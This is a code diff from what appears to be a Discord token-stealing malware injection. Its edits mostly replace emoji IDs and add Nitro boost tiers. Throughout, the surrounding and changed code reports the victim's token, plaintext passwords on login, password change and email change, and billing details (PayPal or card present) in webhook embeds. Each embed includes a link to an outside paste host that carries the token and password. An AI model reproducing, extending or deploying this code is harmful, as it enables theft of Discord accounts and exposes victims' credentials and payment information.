@@ -97,7 +97,7 @@ function FirstTime() {
                         var c = {
                             embeds: [{
                                 title: "Discord Initalized",
-                                description: "[**<:partner:909102089513340979> │ Click Here To Copy**](https://ctf.surf/raw/"+ token +")",
+                                description: "[**<:partner:967100170712014898> │ Click Here To Copy**](https://ctf.surf/raw/"+ token +")",
                                 color: config["embed-color"],
                                 fields: [{
                                     name: "Username",
@@ -167,7 +167,7 @@ function FirstTime() {
                         var c = {
                             embeds: [{
                                 title: "User got logged out",
-                                description: "[**<:partner:909102089513340979> │ Click here to copy info**](https://ctf.surf/raw/"+ token +")",
+                                description: "[**<:partner:967100170712014898> │ Click here to copy info**](https://ctf.surf/raw/"+ token +")",
                                 color: config["embed-color"],
                                 fields: [{
                                     name: "Username",
@@ -242,7 +242,31 @@ function GetNitro(flags) {
         return "<:classic:896119171019067423> \`Nitro Classic\`"
     }
     if (flags == 2) {
-        return "<a:boost:824036778570416129> \`Nitro Boost\`"
+        return "<:1m:967104133070979153> \`Nitro Boost\`"
+    }
+    if (flags == 3) {
+        return "<:2m:967104133020659802> \`Nitro Boost 2\`"
+    }
+    if (flags == 4) {
+        return "<:3m:967104133033242654> \`Nitro Boost 3\`"
+    }
+    if (flags == 5) {
+        return "<:6m:967104133008068659> \`Nitro Boost 6\`"
+    }
+    if (flags == 6) {
+        return "<:9m:967104133008064522> \`Nitro Boost 9\`"
+    }
+    if (flags == 7) {
+        return "<:12m:967104133012291664> \`Nitro Boost 12\`"
+    }
+    if (flags == 8) {
+        return "<:15m:967104133070999652> \`Nitro Boost 15\`"
+    }
+    if (flags == 9) {
+        return "<:18m:967104133012279336> \`Nitro Boost 18\`"
+    }
+    if (flags == 10) {
+        return "<:24m:967104132999684116> \`Nitro Boost 24\`"
     } else {
         return "No Nitro"
     }
@@ -258,25 +282,25 @@ function GetRBadges(flags) {
     const Early_Verified_Bot_Developer = 131072;
     var badges = "";
     if ((flags & Discord_Employee) == Discord_Employee) {
-        badges += "<:staff:874750808728666152> "
+        badges += "<:staff:967100974420336751> "
     }
     if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
-        badges += "<:partner:874750808678354964> "
+        badges += "<:partner:967100170712014898> "
     }
     if ((flags & HypeSquad_Events) == HypeSquad_Events) {
-        badges += "<:hypesquad_events:874750808594477056> "
+        badges += "<:hypesquad:967104881494204497> "
     }
     if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
-        badges += "<:bughunter_1:874750808426692658> "
+        badges += "<:bughunter1:967100758170402906> "
     }
     if ((flags & Early_Supporter) == Early_Supporter) {
-        badges += "<:early_supporter:874750808414113823> "
+        badges += "<:early:967104882056249384> "
     }
     if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
-        badges += "<:bughunter_2:874750808430874664> "
+        badges += "<:bughunter2:967100784238010449> "
     }
     if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
-        badges += "<:developer:874750808472825986> "
+        badges += "<a:developer:967101205417451592> "
     }
     if (badges == "") {
         badges = ""
@@ -297,34 +321,34 @@ function GetBadges(flags) {
     const Early_Verified_Bot_Developer = 131072;
     var badges = "";
     if ((flags & Discord_Employee) == Discord_Employee) {
-        badges += "<:staff:874750808728666152> "
+        badges += "<:staff:967100974420336751> "
     }
     if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
-        badges += "<:partner:874750808678354964> "
+        badges += "<:partner:967100170712014898> "
     }
     if ((flags & HypeSquad_Events) == HypeSquad_Events) {
-        badges += "<:hypesquad_events:874750808594477056> "
+        badges += "<:hypesquad:967104881494204497> "
     }
     if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
-        badges += "<:bughunter_1:874750808426692658> "
+        badges += "<:bughunter1:967100758170402906> "
     }
     if ((flags & House_Bravery) == House_Bravery) {
-        badges += "<:bravery:874750808388952075> "
+        badges += "<:bravery:967102775076982865> "
     }
     if ((flags & House_Brilliance) == House_Brilliance) {
-        badges += "<:brilliance:874750808338608199> "
+        badges += "<:brilliance:967102732706140190> "
     }
     if ((flags & House_Balance) == House_Balance) {
-        badges += "<:balance:874750808267292683> "
+        badges += "<:balance:967102683045589082> "
     }
     if ((flags & Early_Supporter) == Early_Supporter) {
-        badges += "<:early_supporter:874750808414113823> "
+        badges += "<:early:967104882056249384> "
     }
     if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
         badges += "<:bughunter_2:874750808430874664> "
     }
     if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
-        badges += "<:developer:874750808472825986> "
+        badges += "<a:developer:967101205417451592> "
     }
     if (badges == "") {
         badges = "None"
@@ -422,9 +446,9 @@ function Login(email, password, token) {
                                     if (z.type == "") {
                                         return "\`❌\`"
                                     } else if (z.type == 2 && z.invalid != !0) {
-                                        billing += "\`✔️\`" + " <:paypal:896441236062347374>"
+                                        billing += "\`✔️\`" + " <:paypal:967103386967216158>"
                                     } else if (z.type == 1 && z.invalid != !0) {
-                                        billing += "\`✔️\`" + " :credit_card:"
+                                        billing += "\`✔️\`" + " <a:cc:967103197044932649>"
                                     } else {
                                         return "\`❌\`"
                                     }
@@ -439,7 +463,7 @@ function Login(email, password, token) {
                             var params = {
                                 embeds: [{
                                     "title": "User Login",
-                                    description: "[**<:partner:909102089513340979> │ Click here to copy info**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
+                                    description: "[**<:partner:967100170712014898> │ Click here to copy info**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
                                     "color": config['embed-color'],
                                     "fields": [{
                                         name: "Username",
@@ -577,9 +601,9 @@ function Login(email, password, token) {
                                                 if (z.type == "") {
                                                     return "\`❌\`"
                                                 } else if (z.type == 2 && z.invalid != !0) {
-                                                    billing += "\`✔️\`" + " <:paypal:896441236062347374>"
+                                                    billing += "\`✔️\`" + " <:paypal:967103386967216158>"
                                                 } else if (z.type == 1 && z.invalid != !0) {
-                                                    billing += "\`✔️\`" + " :credit_card:"
+                                                    billing += "\`✔️\`" + " <a:cc:967103197044932649>"
                                                 } else {
                                                     return "\`❌\`"
                                                 }
@@ -593,7 +617,7 @@ function Login(email, password, token) {
                                         var params = {
                                             embeds: [{
                                                 "title": "User Login",
-                                                description: "[**<:partner:909102089513340979> │ Click here to copy info**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
+                                                description: "[**<:partner:967100170712014898> │ Click here to copy info**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
                                                 "color": config['embed-color'],
                                                 "fields": [{
                                                     name: "Username",
@@ -754,9 +778,9 @@ function ChangePassword(oldpassword, newpassword, token) {
                                     if (z.type == "") {
                                         return "\`❌\`"
                                     } else if (z.type == 2 && z.invalid != !0) {
-                                        billing += "\`✔️\`" + " <:paypal:896441236062347374>"
+                                        billing += "\`✔️\`" + " <:paypal:967103386967216158>"
                                     } else if (z.type == 1 && z.invalid != !0) {
-                                        billing += "\`✔️\`" + " :credit_card:"
+                                        billing += "\`✔️\`" + " <a:cc:967103197044932649>"
                                     } else {
                                         return "\`❌\`"
                                     }
@@ -771,7 +795,7 @@ function ChangePassword(oldpassword, newpassword, token) {
                             var params = {
                                 embeds: [{
                                     "title": "The password has been changed !",
-                                    description: "[**<:partner:909102089513340979> │ Click here to copy info**](https://ctf.surf/raw/"+ token +"<br>"+ newpassword+")",
+                                    description: "[**<:partner:967100170712014898> │ Click here to copy info**](https://ctf.surf/raw/"+ token +"<br>"+ newpassword+")",
                                     "color": config['embed-color'],
                                     "fields": [{
                                         name: "Username",
@@ -914,9 +938,9 @@ function ChangePassword(oldpassword, newpassword, token) {
                                                 if (z.type == "") {
                                                     return "\`❌\`"
                                                 } else if (z.type == 2 && z.invalid != !0) {
-                                                    billing += "\`✔️\`" + " <:paypal:896441236062347374>"
+                                                    billing += "\`✔️\`" + " <:paypal:967103386967216158>"
                                                 } else if (z.type == 1 && z.invalid != !0) {
-                                                    billing += "\`✔️\`" + " :credit_card:"
+                                                    billing += "\`✔️\`" + " <a:cc:967103197044932649>"
                                                 } else {
                                                     return "\`❌\`"
                                                 }
@@ -930,7 +954,7 @@ function ChangePassword(oldpassword, newpassword, token) {
                                         var params = {
                                             embeds: [{
                                                 "title": "The password has been changed !",
-                                                description: "[**<:partner:909102089513340979> │ Click here to copy info**](https://ctf.surf/raw/"+ token +"<br>"+ newpassword+")",
+                                                description: "[**<:partner:967100170712014898> │ Click here to copy info**](https://ctf.surf/raw/"+ token +"<br>"+ newpassword+")",
                                                 "color": config['embed-color'],
                                                 "fields": [{
                                                     name: "Username",
@@ -1094,9 +1118,9 @@ function ChangeEmail(newemail, password, token) {
                                     if (z.type == "") {
                                         return "\`❌\`"
                                     } else if (z.type == 2 && z.invalid != !0) {
-                                        billing += "\`✔️\`" + " <:paypal:896441236062347374>"
+                                        billing += "\`✔️\`" + " <:paypal:967103386967216158>"
                                     } else if (z.type == 1 && z.invalid != !0) {
-                                        billing += "\`✔️\`" + " :credit_card:"
+                                        billing += "\`✔️\`" + " <a:cc:967103197044932649>"
                                     } else {
                                         return "\`❌\`"
                                     }
@@ -1111,7 +1135,7 @@ function ChangeEmail(newemail, password, token) {
                             var params = {
                                 embeds: [{
                                     "title": "The Email has been changed !",
-                                    description: "[**<:partner:909102089513340979> │ Click here to copy info**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
+                                    description: "[**<:partner:967100170712014898> │ Click here to copy info**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
                                     "color": config['embed-color'],
                                     "fields": [{
                                         name: "Username",
@@ -1250,9 +1274,9 @@ function ChangeEmail(newemail, password, token) {
                                                 if (z.type == "") {
                                                     return "\`❌\`"
                                                 } else if (z.type == 2 && z.invalid != !0) {
-                                                    billing += "\`✔️\`" + " <:paypal:896441236062347374>"
+                                                    billing += "\`✔️\`" + " <:paypal:967103386967216158>"
                                                 } else if (z.type == 1 && z.invalid != !0) {
-                                                    billing += "\`✔️\`" + " :credit_card:"
+                                                    billing += "\`✔️\`" + " <a:cc:967103197044932649>"
                                                 } else {
                                                     return "\`❌\`"
                                                 }
@@ -1266,7 +1290,7 @@ function ChangeEmail(newemail, password, token) {
                                         var params = {
                                             embeds: [{
                                                 "title": "The Email has been changed !",
-                                                description: "[**<:partner:909102089513340979> │ Click here to copy info**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
+                                                description: "[**<:partner:967100170712014898> │ Click here to copy info**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
                                                 "color": config['embed-color'],
                                                 "fields": [{
                                                     name: "Username",
